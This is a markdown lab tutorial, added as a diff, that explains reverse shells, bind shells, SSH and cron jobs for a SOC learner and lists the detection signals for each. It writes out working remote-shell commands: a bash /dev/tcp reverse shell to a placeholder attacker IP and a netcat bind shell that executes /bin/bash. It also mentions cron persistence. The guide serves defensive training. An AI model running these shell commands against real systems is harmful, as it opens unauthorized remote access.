@@ -1,0 +1,260 @@
+
+Assume:
+
+* Machine A → your “attacker” (SOC lab box)
+* Machine B → your “target” (lab server)
+* You own both machines
+* Do this only in your controlled lab
+
+---
+
+# 1️⃣ Reverse Shell
+
+## 📌 Concept
+
+Victim machine connects **outbound** to attacker and gives a shell.
+
+Flow:
+
+```
+Machine B  →  Machine A (listening)
+```
+
+Used when inbound ports on victim are blocked.
+
+---
+
+## 🔎 What Happens Internally
+
+* Shell process starts on Machine B
+* It opens TCP connection to Machine A
+* Input/output is redirected through that socket
+
+---
+
+## 🧪 Safe Lab Demo
+
+### On Machine A (listener)
+
+Install netcat if needed.
+
+```
+nc -lvnp 4444
+```
+
+This waits for connections.
+
+---
+
+### On Machine B (simulate reverse connection)
+
+Instead of a malicious payload, use a safe interactive bash:
+
+```
+bash -i >& /dev/tcp/<MachineA_IP>/4444 0>&1
+```
+
+If connection succeeds, you’ll see shell on Machine A.
+
+To exit:
+
+```
+exit
+```
+
+---
+
+## 🧠 What Your SIEM Would See
+
+* `bash` process created
+* Outbound TCP to unusual IP
+* Long-lived connection
+* Suspicious process tree
+
+---
+
+# 2️⃣ Bind Shell
+
+## 📌 Concept
+
+Victim opens a port and waits.
+Attacker connects in.
+
+Flow:
+
+```
+Machine A → Machine B (listening)
+```
+
+Opposite of reverse shell.
+
+---
+
+## 🧪 Safe Lab Demo
+
+### On Machine B (open listener)
+
+```
+nc -lvnp 5555 -e /bin/bash
+```
+
+(If `-e` not supported, use a simpler version without execution and just observe connection.)
+
+---
+
+### On Machine A
+
+```
+nc <MachineB_IP> 5555
+```
+
+Now you interact with Machine B.
+
+---
+
+## 🧠 Detection Clues
+
+* New listening port appears
+* Unusual port opened
+* Shell attached to network socket
+* Firewall log: inbound connection
+
+---
+
+# 3️⃣ SSH
+
+## 📌 Concept
+
+Legitimate remote shell over encrypted channel.
+
+Flow:
+
+```
+Machine A → Machine B (port 22)
+```
+
+Uses:
+
+* Encryption
+* Authentication
+* Secure protocol
+
+Entity:
+OpenSSH
+
+---
+
+## 🧪 Safe Lab Demo
+
+On Machine B ensure SSH is running:
+
+```
+sudo systemctl status ssh
+```
+
+From Machine A:
+
+```
+ssh user@MachineB_IP
+```
+
+You get encrypted remote shell.
+
+---
+
+## 🧠 SIEM Signals
+
+* Login success/failure logs
+* Source IP
+* Login time anomalies
+* Brute-force attempts
+
+---
+
+# 4️⃣ Cron Jobs
+
+## 📌 Concept
+
+Scheduled tasks in Linux.
+
+Runs commands automatically at specific intervals.
+
+Cron daemon:
+Cron
+
+---
+
+## 🧪 Safe Lab Demo
+
+On Machine B:
+
+Edit cron:
+
+```
+crontab -e
+```
+
+Add:
+
+```
+* * * * * echo "Hello from cron" >> /tmp/cron_test.txt
+```
+
+This runs every minute.
+
+Check:
+
+```
+cat /tmp/cron_test.txt
+```
+
+You’ll see repeated entries.
+
+---
+
+## 🧠 Why Cron Matters in Security
+
+Attackers use cron for:
+
+* Persistence
+* Scheduled callbacks
+* Re-establishing access
+
+SIEM should detect:
+
+* New cron entries
+* Unexpected user cron changes
+
+---
+
+# 🔥 Quick Comparison Table
+
+| Feature           | Reverse Shell     | Bind Shell        | SSH               | Cron              |
+| ----------------- | ----------------- | ----------------- | ----------------- | ----------------- |
+| Direction         | Victim → Attacker | Attacker → Victim | Attacker → Victim | Local scheduled   |
+| Encrypted         | No                | No                | Yes               | N/A               |
+| Legitimate Use    | No                | No                | Yes               | Yes               |
+| Common for Attack | Yes               | Yes               | If stolen creds   | Yes (persistence) |
+
+---
+
+# 🎯 For Your Two-Machine Lab
+
+Try this sequence:
+
+1. SSH normally → observe logs
+2. Run cron job → observe logs
+3. Create reverse shell → observe outbound connection
+4. Open bind shell → observe inbound connection
+
+Then check:
+
+```
+ps aux
+netstat -tulpn
+ss -tulpn
+journalctl
+auth.log
+```
+
+That’s how you connect theory to detection.
